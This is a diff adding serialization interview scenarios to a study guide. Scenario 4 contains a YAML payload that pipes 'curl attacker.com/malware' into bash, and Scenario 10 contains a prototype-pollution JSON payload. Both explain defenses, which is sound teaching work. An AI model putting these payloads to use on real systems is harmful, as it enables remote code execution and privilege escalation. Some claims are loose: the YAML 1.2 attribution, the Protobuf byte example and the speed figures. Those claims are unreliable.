@@ -236,6 +236,16 @@ In Python, `pickle` does not just store data; **it stores executable bytecode in
 
 ### FAANG Interview Scenarios & Traps:
 
+```mermaid
+flowchart TD
+    subgraph SerializationComparison["Payload Size Comparison"]
+        direction LR
+        JSON["JSON Payload (48 Bytes)<br/>{'user_id': 1001, 'status': 'ACTIVE'}"] 
+        Protobuf["Protobuf Binary (6 Bytes!)<br/>[0x08, 0xE9, 0x07, 0x12, 0x01, 0x01]"]
+        JSON -->|"8x Smaller Wire Footprint!"| Protobuf
+    end
+```
+
 #### Scenario 1: "Why does `JSON.stringify({ a: undefined, b: () => {}, c: NaN })` drop `a` and `b`, but convert `c` to `null`?"
 * **Answer**: The official JSON RFC 8259 specification has **no representation for `undefined`, functions, or `NaN` / `Infinity`**.
   * Properties with `undefined` values or functions are omitted entirely from serialized objects to maintain valid JSON syntax.
@@ -246,6 +256,75 @@ In Python, `pickle` does not just store data; **it stores executable bytecode in
   1. **Binary Varint Encoding**: Numbers are encoded using compact variable-length binary bytes instead of ASCII character strings (e.g. number `1000` is 2 bytes in Protobuf vs 4 bytes in JSON `"1000"`).
   2. **Field Tags Instead of String Keys**: In JSON, the string `"customer_transaction_id"` is repeated millions of times in every single record. In Protobuf, that key is replaced with a 1-byte binary integer tag (`1`).
   3. **Zero-Copy Parsing**: Protobuf schemas generate strongly-typed C++/Java/Go structs, eliminating slow string parsing and regular expression matching.
+
+#### Scenario 3: "Why does `JSON.stringify` crash on circular objects, and how do you handle circular graphs?"
+* **Answer**: If object `A` has property `a.child = B`, and `B` has `b.parent = A`:
+  * Naive recursive serialization enters an **infinite recursive loop**, blowing the call stack and throwing `TypeError: Converting circular structure to JSON`.
+  * **Fix**: Use a WeakSet cycle-detector reviver, or library `flatted` / `json-cycle`:
+    ```javascript
+    const getCircularReplacer = () => {
+        const seen = new WeakSet();
+        return (key, value) => {
+            if (typeof value === "object" && value !== null) {
+                if (seen.has(value)) return "[Circular Reference]";
+                seen.add(value);
+            }
+            return value;
+        };
+    };
+    JSON.stringify(circularObj, getCircularReplacer());
+    ```
+
+#### Scenario 4: "Why does `yaml.load()` in Python cause Remote Code Execution (RCE)?"
+* **Answer**: The full YAML 1.2 specification includes a feature to construct arbitrary Python objects using the `!!python/object/apply` tag.
+  * An attacker can send a YAML string containing:
+    `!!python/object/apply:os.system ["curl attacker.com/malware | bash"]`
+  * Calling unvalidated `yaml.load(payload)` executes the system command during parsing!
+  * **The Rule**: Always use `yaml.safe_load(payload)`, which restricts parsing strictly to basic primitives (dicts, lists, strings, numbers).
+
+#### Scenario 5: "What is Base64 encoding, and why does it inflate data size by exactly 33%?"
+* **Answer**:
+  * Base64 takes **3 bytes of binary data (24 bits)** and splits them into **4 chunks of 6 bits each** ($2^6 = 64$ ASCII characters).
+  * Because 3 bytes become 4 bytes:
+    $$\frac{4 - 3}{3} = \frac{1}{3} = 33.33\% \text{ size inflation}$$
+  * Embedding images in JSON via Base64 increases bandwidth costs by 33%. For production APIs, send raw binary files via `multipart/form-data` or presigned S3 URLs instead!
+
+#### Scenario 6: "How do you parse a CSV line containing commas inside quoted strings like `1,"Smith, John","New York"`?"
+* **Answer**:
+  * Naive `line.split(",")` splits on every comma, corrupting the columns into `['1', '"Smith', ' John"', '"New York']`.
+  * Standard CSV format requires a full state-machine lexer that tracks whether a comma is inside an open quotation mark.
+  * Always use standard library parsers: `csv.reader()` in Python or `csv-parse` in Node.js.
+
+#### Scenario 7: "What is MessagePack (MsgPack) vs. JSON?"
+* **Answer**: MessagePack is "like JSON, but fast and small binary".
+  * It maintains the same key-value dynamic dictionary semantics as JSON (no strict schemas required like Protobuf).
+  * However, numbers, booleans, and small strings are encoded in compact binary tags (e.g. integer `1` is 1 byte instead of ASCII text).
+  * It provides a drop-in 30% reduction in bandwidth and 4x faster parsing over JSON without needing schema compilation.
+
+#### Scenario 8: "Why does `JSON.parse` convert `Date` objects into strings, and how do you restore them?"
+* **Answer**: The JSON format has no native `Date` data type. When serialized, dates are converted to ISO-8601 strings (`"2026-11-01T00:00:00.000Z"`). `JSON.parse()` treats it as a standard string.
+  * **Fix**: Provide a custom **reviver function** to `JSON.parse`:
+    ```javascript
+    const data = JSON.parse(jsonString, (key, value) => {
+        if (typeof value === 'string' && /^\d{4}-\d{2}-\d{2}T/.test(value)) {
+            return new Date(value);
+        }
+        return value;
+    });
+    ```
+
+#### Scenario 9: "How does Protobuf guarantee Backward and Forward Compatibility during Schema Evolution?"
+* **Answer**:
+  * Fields in `.proto` files are identified by their **numeric tag number** (`string email = 2;`), NOT their field name!
+  * **Adding fields**: Old clients simply ignore tag numbers they don't recognize.
+  * **Deleting fields**: You must mark deleted tag numbers as `reserved 2;` so new developers don't reuse tag `2` for a different field, preventing data corruption across version mismatches.
+
+#### Scenario 10: "What is Prototype Pollution during JSON parsing in JavaScript?"
+* **Answer**: If an endpoint parses unvalidated JSON and recursively merges user inputs into an internal object:
+  * An attacker sends: `{ "__proto__": { "isAdmin": true } }`.
+  * If the merge function assigns `target.__proto__.isAdmin = true`, it mutates **`Object.prototype`**!
+  * Every single object in the entire Node.js runtime now inherits `obj.isAdmin === true`, completely bypassing authentication checks!
+  * **Fix**: Use `Object.create(null)` for maps, freeze prototypes (`Object.freeze(Object.prototype)`), or reject keys named `__proto__` and `constructor`.
 
 ---
 
